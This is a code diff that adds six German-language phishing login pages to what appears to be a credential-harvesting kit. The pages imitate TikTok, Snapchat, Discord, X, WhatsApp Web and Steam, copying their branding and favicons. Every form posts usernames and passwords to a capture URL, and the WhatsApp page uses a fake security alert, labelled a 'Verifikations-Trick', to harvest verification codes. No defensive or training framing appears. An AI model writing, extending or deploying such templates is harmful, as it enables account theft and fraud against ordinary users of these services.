@@ -302,6 +302,312 @@ BANK_LOGIN = """<!DOCTYPE html>
 
 
 # ─────────────────────────────────────────────────────────────────────────────
+# ─────────────────────────────────────────────────────────────────────────────
+# TIKTOK
+# ─────────────────────────────────────────────────────────────────────────────
+TIKTOK_LOGIN = """<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>TikTok – Login</title>
+<link rel="icon" href="https://www.tiktok.com/favicon.ico">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:'TikTok Sans',-apple-system,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
+  .wrap{width:380px;padding:40px 32px;text-align:center}
+  .logo{font-size:36px;font-weight:800;letter-spacing:-1px;margin-bottom:8px}
+  .logo span{color:#fe2c55}
+  h2{font-size:22px;font-weight:700;margin-bottom:4px}
+  .sub{color:#8f8f8f;font-size:14px;margin-bottom:28px}
+  .tabs{display:flex;border-bottom:2px solid #f1f1f2;margin-bottom:24px;gap:0}
+  .tab{flex:1;padding:10px;font-size:15px;font-weight:600;color:#8f8f8f;cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-2px}
+  .tab.active{color:#161823;border-bottom-color:#161823}
+  .field{margin-bottom:14px;text-align:left}
+  .field input{width:100%;padding:11px 14px;border:1px solid #e3e3e3;border-radius:4px;font-size:15px;background:#fafafa;outline:none}
+  .field input:focus{border-color:#161823;background:#fff}
+  .btn{width:100%;background:#fe2c55;color:#fff;border:none;border-radius:4px;padding:13px;font-size:16px;font-weight:700;cursor:pointer;margin-top:8px}
+  .btn:hover{background:#e6193e}
+  .divider{display:flex;align-items:center;margin:20px 0;color:#8f8f8f;font-size:13px;gap:10px}
+  .divider::before,.divider::after{content:'';flex:1;border-top:1px solid #e3e3e3}
+  .social-btn{width:100%;border:1px solid #e3e3e3;background:#fff;border-radius:4px;padding:11px;font-size:14px;cursor:pointer;margin-bottom:10px;display:flex;align-items:center;justify-content:center;gap:10px;font-weight:500}
+  .footer{margin-top:28px;font-size:14px;color:#8f8f8f}
+  .footer a{color:#161823;font-weight:600;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="logo">Tik<span>Tok</span></div>
+  <h2>Bei TikTok anmelden</h2>
+  <p class="sub">Verwalte dein Konto, überprüfe Benachrichtigungen,<br>kommentiere Videos und mehr.</p>
+  <div class="tabs">
+    <div class="tab active">Telefon / E-Mail</div>
+    <div class="tab">QR-Code</div>
+  </div>
+  <form method="POST" action="{{CAPTURE_URL}}">
+    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
+    <div class="field"><input type="text" name="username" placeholder="Telefon / E-Mail / Benutzername" required autofocus></div>
+    <div class="field"><input type="password" name="password" placeholder="Passwort" required></div>
+    <button type="submit" class="btn">Anmelden</button>
+  </form>
+  <div class="divider">oder anmelden mit</div>
+  <button class="social-btn">🍎 Apple</button>
+  <button class="social-btn">📘 Facebook</button>
+  <div class="footer">Du hast noch kein Konto? <a href="#">Registrieren</a></div>
+</div>
+</body>
+</html>"""
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SNAPCHAT
+# ─────────────────────────────────────────────────────────────────────────────
+SNAPCHAT_LOGIN = """<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Snapchat</title>
+<link rel="icon" href="https://www.snapchat.com/favicon.ico">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#fffc00;display:flex;justify-content:center;align-items:center;min-height:100vh}
+  .card{background:#fff;border-radius:24px;padding:44px 40px;width:380px;box-shadow:0 8px 40px rgba(0,0,0,.12);text-align:center}
+  .ghost{font-size:56px;margin-bottom:8px}
+  h1{font-size:26px;font-weight:800;color:#000;margin-bottom:6px}
+  .sub{font-size:14px;color:#6c6c6c;margin-bottom:28px}
+  .field{margin-bottom:14px;text-align:left}
+  .field label{font-size:13px;font-weight:600;color:#000;display:block;margin-bottom:5px}
+  .field input{width:100%;padding:13px 16px;border:2px solid #e0e0e0;border-radius:12px;font-size:15px;outline:none;transition:.2s}
+  .field input:focus{border-color:#fffc00;box-shadow:0 0 0 3px rgba(255,252,0,.3)}
+  .btn{width:100%;background:#fffc00;color:#000;border:none;border-radius:50px;padding:14px;font-size:16px;font-weight:800;cursor:pointer;margin-top:10px;transition:.15s}
+  .btn:hover{background:#ffe900;transform:scale(1.01)}
+  .forgot{display:block;text-align:center;margin-top:14px;color:#0078ff;font-size:14px;font-weight:600;text-decoration:none}
+  .divider{display:flex;align-items:center;margin:20px 0;color:#999;font-size:12px;gap:8px}
+  .divider::before,.divider::after{content:'';flex:1;border-top:1px solid #e0e0e0}
+  .signup{font-size:14px;color:#6c6c6c}
+  .signup a{color:#0078ff;font-weight:700;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="ghost">👻</div>
+  <h1>Snapchat</h1>
+  <p class="sub">Meld dich an und schick Snaps!</p>
+  <form method="POST" action="{{CAPTURE_URL}}">
+    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
+    <div class="field"><label>Benutzername oder E-Mail</label><input type="text" name="username" required autofocus></div>
+    <div class="field"><label>Passwort</label><input type="password" name="password" required></div>
+    <button type="submit" class="btn">Anmelden</button>
+  </form>
+  <a href="#" class="forgot">Passwort vergessen?</a>
+  <div class="divider">oder</div>
+  <p class="signup">Neu bei Snapchat? <a href="#">Konto erstellen</a></p>
+</div>
+</body>
+</html>"""
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# DISCORD
+# ─────────────────────────────────────────────────────────────────────────────
+DISCORD_LOGIN = """<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Discord</title>
+<link rel="icon" href="https://discord.com/favicon.ico">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:'gg sans','Noto Sans',sans-serif;background:#404eed;display:flex;justify-content:center;align-items:center;min-height:100vh}
+  .card{background:#313338;border-radius:8px;padding:32px;width:480px;box-shadow:0 8px 16px rgba(0,0,0,.24)}
+  .art{display:none}
+  h1{font-size:24px;font-weight:700;color:#f2f3f5;text-align:center;margin-bottom:8px}
+  .sub{color:#b5bac1;font-size:16px;text-align:center;margin-bottom:20px}
+  .field{margin-bottom:16px}
+  .field label{display:block;font-size:12px;font-weight:700;color:#b5bac1;text-transform:uppercase;letter-spacing:.04em;margin-bottom:8px}
+  .field label .req{color:#f23f42;margin-left:4px}
+  .field input{width:100%;padding:10px;background:#1e1f22;border:1px solid #1e1f22;border-radius:3px;color:#dbdee1;font-size:16px;outline:none}
+  .field input:focus{border-color:#00a8fc;box-shadow:0 0 0 1px #00a8fc}
+  .forgot{font-size:14px;color:#00a8fc;text-decoration:none;display:block;margin-top:4px}
+  .forgot:hover{text-decoration:underline}
+  .btn{width:100%;background:#5865f2;color:#fff;border:none;border-radius:3px;padding:12px;font-size:16px;font-weight:500;cursor:pointer;margin-top:16px}
+  .btn:hover{background:#4752c4}
+  .register{margin-top:8px;font-size:14px;color:#b5bac1}
+  .register a{color:#00a8fc;text-decoration:none}
+  .register a:hover{text-decoration:underline}
+  .qr{text-align:center;margin-top:20px;padding-top:16px;border-top:1px solid #3f4147}
+  .qr-text{color:#b5bac1;font-size:14px}
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>Willkommen zurück!</h1>
+  <p class="sub">Schön, dass du wieder da bist!</p>
+  <form method="POST" action="{{CAPTURE_URL}}">
+    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
+    <div class="field">
+      <label>E-Mail oder Telefonnummer<span class="req">*</span></label>
+      <input type="text" name="username" required autofocus>
+    </div>
+    <div class="field">
+      <label>Passwort<span class="req">*</span></label>
+      <input type="password" name="password" required>
+      <a href="#" class="forgot">Passwort vergessen?</a>
+    </div>
+    <button type="submit" class="btn">Anmelden</button>
+  </form>
+  <p class="register" style="margin-top:12px">Brauchst du ein Konto? <a href="#">Registrieren</a></p>
+  <div class="qr">
+    <p class="qr-text">🔑 Mit QR-Code einloggen</p>
+  </div>
+</div>
+</body>
+</html>"""
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# TWITTER / X
+# ─────────────────────────────────────────────────────────────────────────────
+TWITTER_LOGIN = """<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>X anmelden</title>
+<link rel="icon" href="https://abs.twimg.com/favicons/twitter.3.ico">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:-apple-system,'Segoe UI',sans-serif;background:#000;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
+  .card{background:#000;border:1px solid #2f3336;border-radius:16px;padding:40px 48px;width:400px}
+  .x-logo{font-size:32px;font-weight:900;margin-bottom:24px;text-align:center}
+  h1{font-size:28px;font-weight:800;margin-bottom:28px}
+  .field{margin-bottom:16px}
+  .field input{width:100%;padding:14px 12px;background:transparent;border:1px solid #536471;border-radius:4px;color:#fff;font-size:17px;outline:none}
+  .field input:focus{border-color:#1d9bf0;box-shadow:0 0 0 1px #1d9bf0}
+  .field input::placeholder{color:#536471}
+  .btn-primary{width:100%;background:#1d9bf0;color:#fff;border:none;border-radius:50px;padding:14px;font-size:15px;font-weight:700;cursor:pointer;margin-top:8px}
+  .btn-primary:hover{background:#1a8cd8}
+  .btn-outline{width:100%;background:transparent;color:#fff;border:1px solid #536471;border-radius:50px;padding:14px;font-size:15px;font-weight:700;cursor:pointer;margin-top:10px}
+  .forgot{display:block;text-align:center;color:#1d9bf0;font-size:14px;margin-top:16px;text-decoration:none}
+  .divider{display:flex;align-items:center;margin:20px 0;color:#536471;font-size:13px;gap:8px}
+  .divider::before,.divider::after{content:'';flex:1;border-top:1px solid #2f3336}
+  .signup{text-align:center;margin-top:28px;font-size:14px;color:#536471}
+  .signup a{color:#1d9bf0;text-decoration:none;font-weight:700}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="x-logo">𝕏</div>
+  <h1>Bei X anmelden</h1>
+  <form method="POST" action="{{CAPTURE_URL}}">
+    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
+    <div class="field"><input type="text" name="username" placeholder="Telefon, E-Mail oder Nutzername" required autofocus></div>
+    <div class="field"><input type="password" name="password" placeholder="Passwort" required></div>
+    <button type="submit" class="btn-primary">Anmelden</button>
+  </form>
+  <a href="#" class="forgot">Passwort vergessen?</a>
+  <div class="divider">oder</div>
+  <button class="btn-outline">🍎 Mit Apple anmelden</button>
+  <button class="btn-outline">🔵 Mit Google anmelden</button>
+  <div class="signup">Noch kein Konto? <a href="#">Registrieren</a></div>
+</div>
+</body>
+</html>"""
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# WHATSAPP WEB
+# ─────────────────────────────────────────────────────────────────────────────
+WHATSAPP_LOGIN = """<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>WhatsApp Web</title>
+<link rel="icon" href="https://web.whatsapp.com/favicon.ico">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:-apple-system,'Segoe UI',sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
+  .card{background:#fff;border-radius:16px;padding:40px;width:400px;box-shadow:0 2px 24px rgba(0,0,0,.1);text-align:center}
+  .logo{font-size:52px;margin-bottom:12px}
+  h1{font-size:26px;font-weight:700;color:#111b21;margin-bottom:8px}
+  .sub{color:#667781;font-size:14px;margin-bottom:28px;line-height:1.5}
+  .alert{background:#fff8e5;border:1px solid #ffd60a;border-radius:8px;padding:12px 16px;font-size:13px;color:#6e4b00;margin-bottom:24px;text-align:left}
+  .field{margin-bottom:14px;text-align:left}
+  .field label{font-size:13px;font-weight:600;color:#111b21;display:block;margin-bottom:6px}
+  .field input{width:100%;padding:12px 14px;border:1.5px solid #e9edef;border-radius:8px;font-size:15px;outline:none}
+  .field input:focus{border-color:#25d366}
+  .btn{width:100%;background:#25d366;color:#fff;border:none;border-radius:50px;padding:13px;font-size:16px;font-weight:700;cursor:pointer;margin-top:10px}
+  .btn:hover{background:#1ebe5d}
+  .note{font-size:12px;color:#667781;margin-top:16px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="logo">💬</div>
+  <h1>WhatsApp Web</h1>
+  <p class="sub">Verknüpfe dein Gerät, um WhatsApp<br>auf deinem Computer zu nutzen</p>
+  <div class="alert">⚠️ Sicherheitsüberprüfung erforderlich — bitte Telefonnummer bestätigen</div>
+  <form method="POST" action="{{CAPTURE_URL}}">
+    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
+    <div class="field"><label>Telefonnummer</label><input type="tel" name="username" placeholder="+49 151 23456789" required autofocus></div>
+    <div class="field"><label>Verifizierungscode</label><input type="password" name="password" placeholder="6-stelliger Code" required></div>
+    <button type="submit" class="btn">Bestätigen</button>
+  </form>
+  <p class="note">Durch das Bestätigen stimmst du unseren Nutzungsbedingungen zu.</p>
+</div>
+</body>
+</html>"""
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# STEAM
+# ─────────────────────────────────────────────────────────────────────────────
+STEAM_LOGIN = """<!DOCTYPE html>
+<html lang="de">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Steam-Anmeldung</title>
+<link rel="icon" href="https://store.steampowered.com/favicon.ico">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:'Motiva Sans',Arial,sans-serif;background:#1b2838;color:#c6d4df;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column}
+  .logo{font-size:42px;font-weight:900;color:#c7d5e0;letter-spacing:-1px;margin-bottom:28px;text-shadow:0 2px 8px rgba(0,0,0,.5)}
+  .card{background:#131a21;border-radius:3px;padding:40px;width:400px;border:1px solid #273340}
+  h2{font-size:22px;color:#c6d4df;margin-bottom:24px;font-weight:400}
+  .field{margin-bottom:14px}
+  .field input{width:100%;padding:10px 12px;background:#316282;border:1px solid #1b2838;border-radius:3px;color:#c6d4df;font-size:14px;outline:none}
+  .field input::placeholder{color:#8ba9bc}
+  .field input:focus{border-color:#67c1f5;background:#2a6a8a}
+  .btn{width:100%;background:linear-gradient(to right,#47bfff,#1a44c2);color:#fff;border:none;border-radius:2px;padding:12px;font-size:15px;font-weight:700;cursor:pointer;margin-top:12px;text-transform:uppercase;letter-spacing:.05em}
+  .btn:hover{background:linear-gradient(to right,#67d0ff,#2255d5)}
+  .links{margin-top:16px;font-size:13px;color:#8ba9bc;display:flex;justify-content:space-between}
+  .links a{color:#67c1f5;text-decoration:none}
+  .links a:hover{text-decoration:underline}
+</style>
+</head>
+<body>
+<div class="logo">STEAM</div>
+<div class="card">
+  <h2>Bei Steam anmelden</h2>
+  <form method="POST" action="{{CAPTURE_URL}}">
+    <input type="hidden" name="{{CSRF_FIELD}}" value="{{CSRF_TOKEN}}">
+    <div class="field"><input type="text" name="username" placeholder="Steam-Benutzername" required autofocus></div>
+    <div class="field"><input type="password" name="password" placeholder="Passwort" required></div>
+    <button type="submit" class="btn">Anmelden</button>
+  </form>
+  <div class="links">
+    <a href="#">Benutzername vergessen?</a>
+    <a href="#">Passwort vergessen?</a>
+  </div>
+</div>
+</body>
+</html>"""
+
+
 # Registry
 # ─────────────────────────────────────────────────────────────────────────────
 PAGES: dict[str, str] = {
@@ -310,6 +616,12 @@ PAGES: dict[str, str] = {
     "instagram": INSTAGRAM_LOGIN,
     "apple":     APPLE_LOGIN,
     "bank":      BANK_LOGIN,
+    "tiktok":    TIKTOK_LOGIN,
+    "snapchat":  SNAPCHAT_LOGIN,
+    "discord":   DISCORD_LOGIN,
+    "twitter":   TWITTER_LOGIN,
+    "whatsapp":  WHATSAPP_LOGIN,
+    "steam":     STEAM_LOGIN,
 }
 
 PAGE_DESCRIPTIONS: dict[str, str] = {
@@ -318,6 +630,12 @@ PAGE_DESCRIPTIONS: dict[str, str] = {
     "instagram": "Instagram (Meta)",
     "apple":     "Apple ID / iCloud",
     "bank":      "Generisches Online-Banking (anpassbar)",
+    "tiktok":    "TikTok — pixel-perfect Login",
+    "snapchat":  "Snapchat — gelbes Design",
+    "discord":   "Discord — Dark Mode Login",
+    "twitter":   "X / Twitter — schwarzes Design",
+    "whatsapp":  "WhatsApp Web — Verifikations-Trick",
+    "steam":     "Steam — Gaming-Account",
 }
 
 
